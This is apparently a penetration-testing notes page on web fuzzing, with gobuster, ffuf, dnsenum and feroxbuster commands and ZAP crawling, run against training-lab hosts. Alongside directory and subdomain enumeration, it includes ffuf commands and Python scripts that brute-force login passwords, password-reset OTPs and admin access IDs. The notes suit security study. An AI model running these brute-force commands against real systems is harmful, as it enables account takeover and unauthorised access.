# Fuzzing

Fuzzing is commonly used for enumeration and discovering hidden files or directories within a target system. It is an effective technique to identify additional entry points or potential vulnerabilities.

* Subdomain Enumeration: Fuzzing can be used to discover subdomains of a target domain by trying different combinations or variations of subdomain names.

* Directory Enumeration: Fuzzing directories involves brute-forcing different directory paths or names within a web application or file system. It helps in identifying hidden or undisclosed directories that may contain sensitive information or reveal potential vulnerabilities.

* File Enumeration: Fuzzing files entails trying various file names or extensions to discover files that may not be publicly linked or referenced. This can lead to the identification of hidden files containing sensitive data or configuration information.

* Endpoint Enumeration: Fuzzing can be used to enumerate API endpoints or other service endpoints by testing different paths or parameter values. This helps in identifying undocumented or hidden functionalities that may have security implications.


Tools like Gobuster, FFUF, Feroxbuster, and others are commonly used for fuzzing and enumeration purposes. They provide customizable wordlists, parameter fuzzing options, recursive scanning, and other features to aid in the discovery of hidden assets and potential security weaknesses.

## Directories

![Pasted image 20220805174013](https://github.com/dbissell6/Shadow_Stone/assets/50979196/aed7cf18-807f-42a2-9af1-2d582bebae46)

```
gobuster dir --url http://83.136.254.47:59324/webfuzzing_hidden_path --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 
```


## Files

# To add extentions
```
gobuster dir --url http://83.136.254.47:59324/webfuzzing_hidden_path/flag --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt,bak,js  
```



## DNS-vhost

![Pasted image 20220805174028](https://github.com/dbissell6/Shadow_Stone/assets/50979196/1a02832a-6c1f-4bd9-8e47-b4a4d5fa7d8a)

```
ffuf -u "http://flight.htb" -H "Host: FUZZ.flight.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -c -t 50 -fs 7069
```

```
dnsenum --dnsserver 10.129.130.25 --enum -p 0 -s 0 -o subdomains.txt -f /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb
```

![Pasted image 20230420152217](https://github.com/dbissell6/Shadow_Stone/assets/50979196/8549cdf7-ce85-4045-adee-78ec238baee1)

### Manually

```
for sub in $(cat /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt); do dig $sub.inlanefreight.htb @10.129.130.25 | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt;done
```

## Fuzzing APIs

# Below worked on parrot not on kali tho

```#ffuf -w pins.txt:PASS -u http://83.136.255.235:36730/api/v1/authentication/customers/passwords/resets -X POST -H "Content-Type: application/json" -H 'accept: application/json' -d '{"Email": "MasonJenkins@ymail.com", "OTP": "PASS", "NewPassword": "Vivi123"}' -fr "false"
```
# Below code with 2 wordlist input
```
#ffuf -w /opt/useful/seclists/Passwords/xato-net-10-million-passwords-10000.txt:PASS -w customerEmails.txt:EMAIL -u http://94.237.59.63:31874/api/v1/authentication/customers/sign-in -X POST -H "Content-Type: application/json" -d '{"Email": "EMAIL", "Password": "PASS"}' -fr "Invalid Credentials" -t 100
```


<details>

<summary>Python code to fuzz POST APIs</summary>

```
    import requests
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
import time

# API URL
url = 'http://83.136.254.113:44924/post.php'

# Headers required for the request
headers = {
    'accept': 'application/json',
    'Content-Type': 'application/x-www-form-urlencoded'
}



# Create a session for making requests
session = requests.Session()

# Define retry strategy
retry_strategy = Retry(
    total=5,  # Retry up to 5 times
    status_forcelist=[429, 500, 502, 503, 504],  # Retry for these status codes
    allowed_methods=["POST"],  # Only retry for POST requests
    backoff_factor=1  # Exponential backoff: 1, 2, 4, 8 seconds, etc.
)

adapter = HTTPAdapter(max_retries=retry_strategy)
session.mount("http://", adapter)
session.mount("https://", adapter)

# Path to your wordlist file
wordlist_file = '/usr/share/seclists/Discovery/Web-Content/common.txt'

# Open the wordlist file and iterate through each word (OTP)
with open(wordlist_file, 'r') as file:
    for line in file:
        otp = line.strip()  # Read each line, strip any extra spaces or newline characters
        
        # The data payload for the POST request
        data = {

            "y": otp,  # Use OTP from the wordlist
        }

        try:
            # Send the POST request to the API
            response = session.post(url, headers=headers, data=data)

            # Check the response for success or failure
            if response.status_code == 200:
                if "false" not in response.text:
                    print(response.text)
                    
                    break
                else:
                    print(f"Tried OTP {otp}: Invalid Credentials")
            else:
                print(f"Error: {response.status_code} when trying OTP {otp}")

        except requests.exceptions.ConnectionError as e:
            # Handle connection errors (e.g., connection reset by peer)
            print(f"Connection error: {e}. Retrying...")
            time.sleep(5)  # Wait for 5 seconds before retrying
                                                                              
```

</details>

<details>

<summary>Python code to fuzz GET APIs</summary>

```
    import requests
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
import time

# API URL
url = 'http://83.136.255.217:45477/admin/panel.php?accessID='

# Headers required for the request



# Create a session for making requests
session = requests.Session()

# Define retry strategy
retry_strategy = Retry(
    total=5,  # Retry up to 5 times
    status_forcelist=[429, 500, 502, 503, 504],  # Retry for these status codes
    allowed_methods=["GET"],  # Only retry for POST requests
    backoff_factor=1  # Exponential backoff: 1, 2, 4, 8 seconds, etc.
)

adapter = HTTPAdapter(max_retries=retry_strategy)
session.mount("http://", adapter)
session.mount("https://", adapter)

# Path to your wordlist file
wordlist_file = '/usr/share/seclists/Discovery/Web-Content/common.txt'

# Open the wordlist file and iterate through each word (OTP)
with open(wordlist_file, 'r') as file:
    for line in file:
        otp = line.strip()  # Read each line, strip any extra spaces or newline characters
        try:
            # Send the POST request to the API
            response = session.post(url+otp)

            # Check the response for success or failure
            if response.status_code == 200:
                
                print(response.text)
                
                
            else:
                #print(f"Error: {response.status_code} when trying {otp}")
                pass
        except requests.exceptions.ConnectionError as e:
            # Handle connection errors (e.g., connection reset by peer)
            print(f"Connection error: {e}. Retrying...")
            time.sleep(5)  # Wait for 5 seconds before retrying
```

</details>



## feroxbuster
![Pasted image 20220805174002](https://github.com/dbissell6/Shadow_Stone/assets/50979196/c660c189-25fe-4a09-9447-0f6c8b722cf4)


## Zap crawling
Can find files and direcotries by scanning the site for links.

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/b50cfe41-72c6-4804-a286-b6b4f0a2e60c)

### Spider

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/3a2f8d81-a0dd-411f-8e42-597eec0575a5)

Create folder on left

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/286e2767-69fa-49d0-aae7-ce82be073ecf)


